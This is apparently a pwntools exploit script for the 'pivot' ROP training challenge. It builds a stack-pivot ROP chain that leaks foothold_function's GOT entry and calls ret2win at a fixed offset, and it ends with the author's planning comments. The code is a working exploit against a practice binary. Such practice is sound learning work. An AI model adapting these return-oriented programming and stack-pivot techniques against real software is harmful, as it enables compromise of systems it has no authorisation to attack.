#!/usr/bin/python3
from pwn import *

REMOTE = False
ip = '127.0.0.1'
port = 80
filepath = './pivot'

elf = context.binary = ELF(filepath, checksec=False)
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']
if REMOTE is True:
    p = remote(ip, port)
else:
    # p = process(filepath)
    # gdb.attach(p)
    ### OR if you want to start the process with gdb instead of attaching
    p = gdb.debug(filepath, gdbscript='''
    b *pwnme+182
    c
    ''')

elf = ELF(filepath, checksec=False)
rop1 = ROP(elf)
rop2 = ROP(elf)

useless_function_addr = p64(0x00000000004009A8)
foothold_function_got_plt = p64(0x601040)
foothold_function_plt = p64(0x0000000000400720)

pop_rax_gadget = p64(0x00000000004009BB)
xchg_rax_rsp_gadget = p64(0x00000000004009BD)
mov_rax_rax_gadget = p64(0x00000000004009C0)
call_rax_gadget = p64(0x00000000004006b0) 
pop_rbp_gadget = p64(0x00000000004007c8)
add_rax_rbp_gadget = p64(0x00000000004009c4)

def pad_rop(rop, size):
    rop.raw(rop.generatePadding(0, size))

def set_stack_ptr(rop, value):
    rop.raw(pop_rax_gadget)
    rop.raw(value)
    rop.raw(xchg_rax_rsp_gadget)

def call_foothold_function(rop, foothold_function):
    rop.raw(foothold_function)

def leak_foohold_function_addr(rop, foothold_function_got_plt):
    # At the end of this, RAX will contain the address of the foothold function
    rop.raw(pop_rax_gadget)
    rop.raw(foothold_function_got_plt)
    rop.raw(mov_rax_rax_gadget)

def call_ret2win(rop):
    ret2win_offset = p64(0x117)
    rop.raw(pop_rbp_gadget)
    rop.raw(ret2win_offset)
    rop.raw(add_rax_rbp_gadget)
    rop.raw(call_rax_gadget)

p.recvuntil(b'The Old Gods kindly bestow upon you a place to pivot: ')
heap_rop_addr = p64(int(p.recvline().strip().decode()[2:], 16))
print(f'Heap ROP address: 0x{"".join([heap_rop_addr.hex()[i:i+2] for i in range(len(heap_rop_addr.hex()), -1, -2)])}')

# Setup stack ROP chain
pad_rop(rop1, 0x28)
set_stack_ptr(rop1, heap_rop_addr)

# Setup heap ROP chain
call_foothold_function(rop2, foothold_function_plt)
leak_foohold_function_addr(rop2, foothold_function_got_plt)
call_ret2win(rop2)

# Write to heap
p.sendline(rop2.chain())
p.recvuntil(b'stack smash')

# Write to stack
p.sendline(rop1.chain())
p.interactive()

# Things to do
# 1. Call useless function to load foothold function into got.plt
# 2. Leak the address of the foothold function into register
# 3. Call the ret2win function using known offset from the leaked address

# In assembly, that's basically
# call _foothold_function
# mov rax, [0x601040]   ; This is the .got.plt address of the foothold function
# add rax, 0x117        ; This is the offset of ret2win from the foothold function
# call rax              ; And this finally calls ret2win

# Now to do so, we must make use of a larger stack frame. We will therefore
# need a gadget to move RSP to point to the heap address, where we will write
# the rest of our ROP chain.

# TODO: Find a way to call the foothold function without ending up calling exit (see uselessFunction) to load the 
# foothold function into the .got.plt. This is necessary to leak the address of the foothold function.
# Also, the third usefulGadget may be interesting to extract the address of the foothold function from the .got.plt.
